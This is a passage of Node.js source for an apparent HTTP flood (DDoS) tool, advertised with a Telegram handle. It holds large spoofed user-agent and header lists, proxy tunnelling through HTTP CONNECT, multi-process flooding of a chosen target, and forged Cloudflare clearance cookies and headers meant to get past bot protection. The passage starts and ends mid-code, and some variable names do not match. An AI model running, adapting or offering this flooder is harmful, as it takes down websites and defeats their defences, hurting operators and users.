'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466689893 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7865156642124093568 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6670751412956561496 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4561993359 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1845925232077549528 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1261276775280332682 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v7810421046257064829 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v8492051667383076268 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v825080150562520833 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466718264 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v9115122683762782470 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4562017263 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v3868737290396490733 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v697612484780489074 t6583828985718256818 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8352206510814970335 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2496106158381954575 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466737224 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v3494567444137370641 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8456192580969411449 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4033463474784022088 t7454547885219621689 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3487728955102158976 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562041164 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v2028522216649479612 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466765596 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v7057368071126839728 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4531716181114487945 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7839198237783962048 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2868933807952903034 t1479978021737656703 ath4b3726d5 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562065068 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2194678058344203461 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2718743228222662861 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7590918487987830442 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466784599 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1609911553678633550 t3428360957270603442 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36/JrKhPNkF-40',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1963937732068003945 t4109306862226254733 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6911884164551000505 t1865758485807943117 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562088966 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1614683479483188728 t108896256523930349 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v9072378626783597796 t8093092299234304605 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2877543591798990017 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466812979 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5523782189735053614 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v9047047070013589437 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v561687782311054040 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5534684115277472898 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466831043 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v2759418202117184174 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2348282376621666327 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4562112209 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4832822234644260482 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8013439855011271596 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v7458889217659953098 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v2589944954845346012 t4684696140914125110 ath93eb305d altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1759747179826740674 t4619802339571665632 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466859412 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4562136107 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v180382763332506508 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]',
'Mozilla/5.0 (Linux; Android 10; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.56 Mobile Safari/537.36',
'Opera/9.80 (Android; Opera Mini/7.6.40099/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 11; Scepter 8 Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; LG-K425) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Linux armv7l; rv:95.0) Gecko/20100101 Firefox/95.0',
'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4657.124 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4653.100 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; en-US) Gecko/20100101 Firefox/89.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4691.107 Safari/537.36',
'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4655.154 Safari/537.36',
'Mozilla/5.0 (Linux; arm_64; Android 11; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.1.114.00 SA/3 Mobile Safari/537.36',
'SAMSUNG-SM-B313E Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40318/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
'ELinks/0.11.1-1.2ubuntu2.2-debian (textmode; Linux 2.6.20-16-generic i686; 80x24-2)',
'Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
'Opera/9.80 (Android; Opera Mini/20.0.2254/191.256; U; tr) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto e5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 EdgA/96.0.1054.62',
'Mozilla/5.0 (Linux; Android 10; GM1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4692.56 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A415F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/343.0.0.37.117;]',
'Mozilla/5.0 (Linux; Android 10; moto g power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; BQ-6040L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; ONEPLUS A3010 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7; rv:94.0) Gecko/20100101 Firefox/94.0',
'Mozilla/5.0 (Linux; Android 11; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
];
    const accept_header = [
            '*/*',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
            'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
            'text/html, application/xhtml+xml, image/jxr, */*',
            'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
            'application/javascript, */*;q=0.8',
            'text/html, text/plain; q=0.6, */*; q=0.1',
            'application/graphql, application/json; q=0.8, application/xml; q=0.7',
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        ],
        cache_header = [
            'no-cache',
            'no-store',
            'no-transform',
            'only-if-cached',
            'max-age=0',
            'must-revalidate',
            'public',
            'private',
            'proxy-revalidate'
        ],
        lang_header = [
            'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
            'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
            'en-US,en;q=0.5',
            'en-US,en;q=0.9',
            'de-CH;q=0.7',
            'da, en-gb;q=0.8, en;q=0.7',
            'cs;q=0.5',
             'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8',
          ],
        platform = [
            "Windows",
            "Macintosh",
            "Linux",
            "iOS",
            "Android",
            "PlayStation 4",
            "iPhone",
            "iPad",
            "Other"
        ],
        dest_header = [
            'audio',
            'audioworklet',
            'document',
            'embed',
            'empty',
            'font',
            'frame',
            'iframe',
            'image',
            'manifest',
            'object',
            'paintworklet',
            'report',
            'script',
            'serviceworker',
            'sharedworker',
            'style',
            'track',
            'video',
            'worker',
            'xslt',
            ''
        ],
        mode_header = [
            'cors',
            'navigate',
            'no-cors',
            'same-origin',
            'websocket'
        ],
        site_header = [
            'cross-site',
            'same-origin',
            'same-site',
            'none'
        ],
        encoding_header = [
            'deflate, gzip;q=1.0, *;q=0.5',
            'gzip, deflate, br',
            'gzip, deflate',
            '*',
        ]
    var proxies = readLines(args.proxy);
    const parsedTarget = url.parse(args.target);

    if (cluster.isMaster) {
        const dateObj = new Date();
        for (let i = 0; i < process.argv[5]; i++) {
            cluster.fork();
        }
        console.clear()
    console.log("Telegram: @ngocphong0311 ( HTTPS )".rainbow);
    console.log(`\x1b[33mTarget: \x1b[0m${process.argv[2]}`);
    console.log(`\x1b[33mTime: \x1b[0m${process.argv[3]}`);
    console.log(`\x1b[33mRate: \x1b[0m${process.argv[4]}`);
    console.log(`\x1b[33mThread: \x1b[0m${process.argv[5]}`);
    console.log(`\x1b[33mProxyFile: \x1b[0m${process.argv[6]} | \x1b[33mTotal(s): \x1b[0m${proxies.length}`);
    console.log(`--------------------------------------`);
        setTimeout(() => {}, process.argv[5] * 1000);
        for (let counter = 1; counter <= args.threads; counter++) {
            cluster.fork();
        }
    } else {
        setInterval(runFlooder)
    }

    class NetSocket {
        constructor() {}

        HTTP(options, callback) {
            const parsedAddr = options.address.split(":");
            const addrHost = parsedAddr[0];
            const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
            const buffer = new Buffer.from(payload);
            const connection = net.connect({
                host: options.host,
                port: options.port,
                allowHalfOpen: true,
                writable: true,
                readable: true
            });

            connection.setTimeout(options.timeout * 20000);
            connection.setKeepAlive(true, 20000);
            connection.setNoDelay(true);
            connection.on("connect", () => {
                connection.write(buffer);
            });

            connection.on("data", chunk => {
                const response = chunk.toString("utf-8");
                const isAlive = response.includes("HTTP/1.1 200");
                if (isAlive === false) {
                    connection.destroy();
                    return callback(undefined, "403");
                }
                return callback(connection, undefined);
            });

            connection.on("timeout", () => {
                connection.destroy();
                return callback(undefined, "403");
            });

            connection.on("error", error => {
                connection.destroy();
                return callback(undefined, "403");
            });
        }
    }
    const newua = userAgent[Math.floor(Math.floor(Math.random() * userAgent.length))];
    const Socker = new NetSocket();
    headers[":method"] = "GET";
    headers[":path"] = parsedTarget.path;
    headers[":scheme"] = "https";
    headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
    headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
    headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
    headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
    headers["pragma"] = "no-cache";
    headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
    headers["sec-ch-ua"] = newua;
    headers["cf-cache-status"] = "DYNAMIC";
    headers["referer"] = "https://www.google.com/";
    headers["priority"] = "u=0, 1";
    headers["origin"] = parsedTarget.host;
    headers["cdn-loop"] = "cloudflare";
    headers["sec-ch-ua-mobile"] = "?0";
    headers["sec-ch-ua-platform"] = platform[Math.floor(Math.random() * platform.length)];
    headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
    headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
